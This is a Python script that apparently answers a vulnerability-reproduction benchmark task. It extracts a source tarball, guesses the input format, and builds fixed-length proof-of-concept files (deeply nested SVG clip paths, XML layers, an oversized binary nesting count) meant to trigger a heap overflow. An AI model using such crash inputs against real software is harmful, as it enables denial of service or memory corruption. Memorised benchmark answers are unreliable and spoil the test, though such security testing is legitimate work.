import os
import re
import tarfile
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract tarball to examine source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for relevant files that might contain the vulnerability
            root_dir = Path(tmpdir)
            
            # First, try to understand the format by looking for common patterns
            # Check for files mentioning clip, layer, stack, nesting, etc.
            relevant_files = []
            for ext in ['.c', '.cpp', '.h', '.hpp', '.cc', '.cxx']:
                for file_path in root_dir.rglob(f'*{ext}'):
                    try:
                        content = file_path.read_text(errors='ignore')
                        if any(keyword in content.lower() for keyword in 
                               ['clip', 'layer', 'stack', 'nesting', 'push', 'pop']):
                            relevant_files.append(file_path)
                    except:
                        continue
            
            # Analyze files to determine the format
            poc = self._generate_poc_based_on_analysis(relevant_files)
            
            # If analysis fails, use default pattern based on typical heap overflow
            if poc is None:
                poc = self._generate_default_poc()
            
            return poc
    
    def _generate_poc_based_on_analysis(self, files):
        """Analyze source files to generate targeted PoC."""
        if not files:
            return None
        
        # Look for patterns that might indicate input format
        format_patterns = [
            r'input.*format.*=.*[\'"]([^\'"]+)[\'"]',
            r'parse.*format.*[\'"]([^\'"]+)[\'"]',
            r'file.*extension.*[\'"]([^\'"]+)[\'"]',
            r'\.([a-z0-9]+).*format',
        ]
        
        for file_path in files[:10]:  # Check first 10 relevant files
            try:
                content = file_path.read_text(errors='ignore')
                
                # Check for common graphics/vector formats
                if any(fmt in content.lower() for fmt in 
                       ['svg', 'pdf', 'ps', 'postscript', 'eps', 'ai', 'dxf']):
                    # Likely a vector graphics format - create deep nesting
                    return self._generate_vector_graphics_poc()
                
                # Check for XML/HTML-like formats
                if any(tag in content for tag in 
                       ['<clip', '<layer', '<group', '<?xml', '<!DOCTYPE']):
                    return self._generate_xml_poc()
                
                # Check for binary formats
                if 'binary' in content.lower() or 'magic' in content.lower():
                    return self._generate_binary_poc()
                    
            except:
                continue
        
        return None
    
    def _generate_vector_graphics_poc(self):
        """Generate PoC for vector graphics format with deep nesting."""
        # Create a structure with very deep nesting of clip/layer elements
        # Using SVG-like format as example
        poc = b'<?xml version="1.0" encoding="UTF-8"?>\n'
        poc += b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
        poc += b'<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1000" height="1000">\n'
        
        # Create deeply nested clip paths
        nesting_depth = 10000  # Excessive nesting to trigger overflow
        
        for i in range(nesting_depth):
            poc += b'  ' * (i + 1) + f'<clipPath id="clip{i}">\n'.encode()
            poc += b'  ' * (i + 2) + f'<rect x="0" y="0" width="{i+1}" height="{i+1}"/>\n'.encode()
        
        # Close all clipPath elements
        for i in range(nesting_depth - 1, -1, -1):
            poc += b'  ' * (i + 1) + b'</clipPath>\n'
        
        # Add content that uses all clip paths
        poc += b'  <rect x="0" y="0" width="1000" height="1000" fill="red" clip-path="url(#clip0)"/>\n'
        poc += b'</svg>'
        
        # Ensure we reach approximately the target length
        target_length = 825339
        if len(poc) < target_length:
            # Pad with comments
            padding = b'<!-- ' + b'X' * (target_length - len(poc) - 10) + b' -->\n'
            poc = poc.replace(b'</svg>', padding + b'</svg>')
        
        return poc[:target_length] if len(poc) > target_length else poc
    
    def _generate_xml_poc(self):
        """Generate PoC for XML-based format."""
        poc = b'<?xml version="1.0"?>\n'
        poc += b'<document>\n'
        
        # Create deeply nested structure
        depth = 20000
        
        for i in range(depth):
            poc += b'  ' * (i + 1) + f'<layer id="layer{i}">\n'.encode()
            poc += b'  ' * (i + 2) + f'<clip enabled="true">\n'.encode()
            poc += b'  ' * (i + 3) + f'<rect x="0" y="0" width="100" height="100"/>\n'.encode()
            poc += b'  ' * (i + 2) + b'</clip>\n'
        
        # Close all elements
        for i in range(depth - 1, -1, -1):
            poc += b'  ' * (i + 1) + b'</layer>\n'
        
        poc += b'</document>'
        
        # Adjust to target length
        target_length = 825339
        current_len = len(poc)
        
        if current_len < target_length:
            # Add padding in a comment
            padding_needed = target_length - current_len
            padding = b'<!--' + b'P' * (padding_needed - 9) + b'-->\n'
            poc = poc.replace(b'</document>', padding + b'</document>')
        
        return poc[:target_length] if len(poc) > target_length else poc
    
    def _generate_binary_poc(self):
        """Generate PoC for binary format."""
        # Create a pattern that might trigger heap overflow:
        # 1. Header/magic bytes
        # 2. Excessive nesting count
        # 3. Repeated clip/layer data
        
        # Start with a simple header
        poc = b'BINARY_FORMAT_v1.0\x00'
        
        # Add an excessively large nesting depth (4 bytes, little endian)
        depth = 0xFFFFFFFF  # Maximum unsigned int
        poc += depth.to_bytes(4, 'little')
        
        # Add repeated clip/layer structures
        # Each structure: type byte + coordinates (8 bytes) + flags (1 byte)
        structure = b'\x01' + b'\xff' * 8 + b'\x00'  # Clip mark structure
        
        # Calculate how many structures we need to reach target length
        target_length = 825339
        remaining = target_length - len(poc)
        num_structures = remaining // len(structure)
        
        poc += structure * num_structures
        
        # Pad to exact length
        if len(poc) < target_length:
            poc += b'\x00' * (target_length - len(poc))
        
        return poc[:target_length]
    
    def _generate_default_poc(self):
        """Generate a generic PoC when analysis fails."""
        # Create a simple text-based format with deep nesting
        poc = b'BEGIN_FORMAT\n'
        poc += b'VERSION:1.0\n'
        poc += b'TYPE:CLIP_STACK\n'
        
        # Add excessive nesting markers
        nesting_depth = 100000
        
        for i in range(nesting_depth):
            poc += f'PUSH_CLIP {i} 0 0 {i+10} {i+10}\n'.encode()
        
        poc += b'END_FORMAT'
        
        # Adjust to target length
        target_length = 825339
        current_len = len(poc)
        
        if current_len < target_length:
            # Add comments to reach target length
            padding_needed = target_length - current_len
            comment_lines = padding_needed // 50
            for _ in range(comment_lines):
                poc += b'# ' + b'X' * 48 + b'\n'
            
            # Add any remaining padding
            remaining = target_length - len(poc)
            if remaining > 0:
                poc += b'#' + b'Y' * (remaining - 1)
        
        return poc[:target_length] if len(poc) > target_length else poc